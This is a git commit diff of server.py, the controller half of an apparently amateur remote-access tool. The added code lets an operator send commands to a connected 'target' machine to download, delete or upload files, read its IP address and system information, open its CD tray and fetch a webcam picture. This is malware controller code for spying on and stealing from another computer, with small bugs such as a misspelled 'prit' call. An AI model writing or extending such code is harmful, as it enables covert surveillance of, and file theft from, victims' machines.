2459ac52f064e79e22584d5757a576150d3ad68e
Harun Reşit <54816285+HarunResit-cyber@users.noreply.github.com>
2020-07-23 18:29:03 +0200

    Update server.py

--- server.py
+++ server.py
@@ -1,20 +1,45 @@
+from datetime import datetime
 import os
-import socket 
+import socket
+import time
+import tkinter as tk
+import winsound
+import pyttsx3 
 
+engine = pyttsx3.init()
 s = socket.socket()
-host = socket.gethostname()
-port = 8080
-s.bind((host, port)) 
-print("\nServer is runing @ ", host)
-print("\nWaiting for connections...")
-s.listen(1)
-conn, addr = s.accept()
-print("")
-print(addr, " Has connected to the server")
+host = "192.168.0.4"
+port = 4242
+my_time = datetime.now()
 
-while 1:
-    print("")
-    command = input(str("Command >> "))
+s.bind((host, port)) 
+print(f"Server is runing: {host}")
+s.listen(2)
+conn, addr = s.accept()
+print(f"\n{addr} Has connected to the server in")
+print(f"Connection date: {my_time}")
+
+engine.say('Connected to Client')
+engine.runAndWait()
+
+print(""" 
+Commands aviable now:
+    view_cwd                     
+    custom_dir
+    download_file                
+    remove_file
+    send_file                    
+    get_ip
+    open_cd
+    beep_it
+    sys_info
+    get_pic
+    """)
+
+
+
+while True:
+    command = input(str("harun-resit>>"))
     if command == "view_cwd":
         conn.send(command.encode())
         print("")
@@ -38,7 +63,7 @@ while 1:
 
     elif command == "download_file":
         conn.send(command.encode())
-        filepath = input(str("File directory name: "))
+        filepath = input(str("File directory and file name: "))
         conn.send(filepath.encode())
         file = conn.recv(100000)
         filename = input(str("Please enter a filename for the incoming file the extension: "))
@@ -54,12 +79,53 @@ while 1:
         conn.send(fileanddir.encode())
         print("File has been removed")
     elif command == "send_file":
+        conn.send(command.encode())
         file = input(str("Please enter file name and directory: "))
-        filename = input(str("İn which name we send the file: "))
+        filename = input(str("In which name we send the file: "))
         data = open(file, "rb")
         file_data = data.read(7000)
-        conn.send(file_data)
-        print(file, " Has been sended")
         conn.send(filename.encode())
+        print(file, " Has been sended")
+        conn.send(file_data)
+    elif command == "get_ip":
+        conn.send(command.encode())
+        ip = conn.recv(2020)
+        ip = ip.decode()
+        print(f"Target's ip adress: {ip}")
+    elif command == "open_cd":
+        conn.send(command.encode())
+        targets_os = conn.recv(2082)
+        targets_os = targets_os.decode()
+        if targets_os == "Windows":
+            print("Targets OS: ", targets_os)
+            print("Cd has opened in the targets machine")
+        else:
+            not_aviable_txt = conn.recv(3042)
+            print(not_aviable_txt.decode())
+    elif command == "beep_it":
+        prit("This command can not be used now")
+    elif command == "sys_info":
+        conn.send(command.encode())
+        info1 = conn.recv(1024)
+        info1 = info1.decode()
+        info2 = conn.recv(1026)
+        info2 = info2.decode()
+        info3 = conn.recv(1028)
+        info3 = info3.decode()
+        print(info1)
+        print(info2)
+        print(info3)
+    elif command == "get_pic":
+        conn.send(command.encode())
+        count = 0
+        while count <= 100:
+            print("Downloading Webcam Picture", count, "%")
+            count += 5
+            time.sleep(0.75)
+        my_pic_data = conn.recv(100000)
+        my_pic = open("test.jpg", "wb")
+        my_pic.write(my_pic_data)
+        my_pic.close()
+        print("Webcam Picture Downloaded")
     else:
         print("Error: Command didn't worked!")
